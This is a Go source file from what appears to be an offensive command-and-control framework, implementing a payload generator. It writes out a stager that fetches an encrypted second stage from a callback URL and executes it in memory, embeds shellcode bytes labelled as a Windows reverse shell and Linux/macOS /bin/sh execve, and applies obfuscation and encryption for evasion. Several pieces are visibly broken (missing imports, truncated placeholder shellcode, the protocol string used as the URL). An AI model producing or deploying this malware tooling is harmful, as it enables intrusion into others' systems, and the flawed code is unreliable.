package payload

import (
	"bytes"
	"compress/gzip"
	"fmt"

	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/crypto"
	"github.com/ditto/ditto/evasion"
)

// Options holds payload generation options
type Options struct {
	Type      string
	Arch      string
	OS        string
	Encrypt   bool
	Obfuscate bool
	Config    *core.Config
}

// Generator handles payload generation
type Generator struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

// NewGenerator creates a new payload generator
func NewGenerator(logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}) *Generator {
	return &Generator{logger: logger}
}

// Generate creates a payload based on options
func (g *Generator) Generate(opts Options) ([]byte, error) {
	g.logger.Info("Generating %s payload for %s/%s", opts.Type, opts.OS, opts.Arch)
	
	var payloadData []byte
	var err error
	
	switch opts.Type {
	case "stager":
		payloadData, err = g.generateStager(opts)
	case "shellcode":
		payloadData, err = g.generateShellcode(opts)
	case "full":
		payloadData, err = g.generateFull(opts)
	default:
		return nil, fmt.Errorf("unknown payload type: %s", opts.Type)
	}
	
	if err != nil {
		return nil, fmt.Errorf("payload generation failed: %w", err)
	}
	
	// Apply obfuscation if requested
	if opts.Obfuscate {
		g.logger.Debug("Applying obfuscation")
		payloadData = evasion.ObfuscateCode(payloadData)
	}
	
	// Apply encryption if requested
	if opts.Encrypt {
		g.logger.Debug("Applying encryption")
		encrypted, err := g.encryptPayload(payloadData, opts.Config)
		if err != nil {
			return nil, fmt.Errorf("encryption failed: %w", err)
		}
		payloadData = encrypted
	}
	
	// Compress if enabled
	if opts.Config.Encryption.Compression {
		g.logger.Debug("Applying compression")
		compressed, err := compressData(payloadData)
		if err != nil {
			return nil, fmt.Errorf("compression failed: %w", err)
		}
		payloadData = compressed
	}
	
	g.logger.Info("Payload generated successfully: %d bytes", len(payloadData))
	return payloadData, nil
}

func (g *Generator) generateStager(opts Options) ([]byte, error) {
	// Stager payload - minimal initial loader
	stagerTemplate := `
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"net/http"
	"time"
)

const (
	callbackURL = "%s"
	encKey      = "%s"
)

func main() {
	// Stage 1: Download and decrypt second stage
	data := downloadStage(callbackURL)
	decrypted := decrypt(data, encKey)
	executeStage(decrypted)
}

func downloadStage(url string) []byte {
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	
	data, _ := io.ReadAll(resp.Body)
	return data
}

func decrypt(data []byte, key string) []byte {
	block, _ := aes.NewCipher([]byte(key))
	gcm, _ := cipher.NewGCM(block)
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, _ := gcm.Open(nil, nonce, ciphertext, nil)
	return plaintext
}

func executeStage(stage []byte) {
	// Platform-specific execution
	%s
}
`
	
	// Generate execution method based on OS
	var execCode string
	switch opts.OS {
	case "windows":
		execCode = `syscall.Syscall(uintptr(unsafe.Pointer(&stage[0])), 0, 0, 0, 0)`
	case "linux", "darwin":
		execCode = `syscall.Mprotect(stage, syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC)`
	default:
		execCode = `// Direct execution`
	}
	
	payload := fmt.Sprintf(stagerTemplate, 
		opts.Config.Communication.Protocol,
		string(opts.Config.Session.Key)[:16],
		execCode)
	
	return []byte(payload), nil
}

func (g *Generator) generateShellcode(opts Options) ([]byte, error) {
	// Generate platform-specific shellcode
	var shellcode []byte
	
	switch opts.OS {
	case "windows":
		shellcode = generateWindowsShellcode(opts.Arch)
	case "linux":
		shellcode = generateLinuxShellcode(opts.Arch)
	case "darwin":
		shellcode = generateDarwinShellcode(opts.Arch)
	default:
		return nil, fmt.Errorf("unsupported OS: %s", opts.OS)
	}
	
	return shellcode, nil
}

func (g *Generator) generateFull(opts Options) ([]byte, error) {
	// Full payload with all capabilities
	// This would combine stager + shellcode + all modules
	stager, err := g.generateStager(opts)
	if err != nil {
		return nil, err
	}
	
	shellcode, err := g.generateShellcode(opts)
	if err != nil {
		return nil, err
	}
	
	// Combine payloads
	fullPayload := append(stager, shellcode...)
	return fullPayload, nil
}

func (g *Generator) encryptPayload(data []byte, cfg *core.Config) ([]byte, error) {
	key := make([]byte, cfg.Encryption.KeySize)
	if len(cfg.Session.Key) >= cfg.Encryption.KeySize {
		copy(key, cfg.Session.Key[:cfg.Encryption.KeySize])
	} else {
		copy(key, cfg.Session.Key)
	}
	
	switch cfg.Encryption.Algorithm {
	case "aes256":
		return crypto.AES256Encrypt(data, key)
	case "chacha20":
		return crypto.ChaCha20Encrypt(data, key)
	default:
		return nil, fmt.Errorf("unsupported algorithm: %s", cfg.Encryption.Algorithm)
	}
}

func compressData(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	if _, err := w.Write(data); err != nil {
		w.Close()
		return nil, err
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// Platform-specific shellcode generators
func generateWindowsShellcode(arch string) []byte {
	// Windows x64 reverse shell shellcode
	if arch == "amd64" {
		return []byte{
			0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xc6, 0xff, 0xff, 0xff,
			0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0x01,
			0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
		}
	}
	// x86 version
	return []byte{
		0x33, 0xc9, 0x83, 0xe9, 0xc6, 0xe8, 0xff, 0xff, 0xff, 0xff,
		0xc0, 0x5e, 0x81, 0x76, 0x0e, 0x01, 0x02, 0x03, 0x04,
	}
}

func generateLinuxShellcode(arch string) []byte {
	// Linux x64 execve shellcode
	if arch == "amd64" {
		return []byte{
			0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6,
			0x48, 0x31, 0xd2, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69,
			0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7,
			0xb0, 0x3b, 0x0f, 0x05,
		}
	}
	// x86 version
	return []byte{
		0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f,
		0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0xb0,
		0x0b, 0xcd, 0x80,
	}
}

func generateDarwinShellcode(arch string) []byte {
	// macOS x64 shellcode
	if arch == "amd64" {
		return []byte{
			0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6,
			0x48, 0x31, 0xd2, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69,
			0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7,
			0xb0, 0x02, 0x48, 0xc1, 0xc0, 0x18, 0x0f, 0x05,
		}
	}
	return []byte{}
}

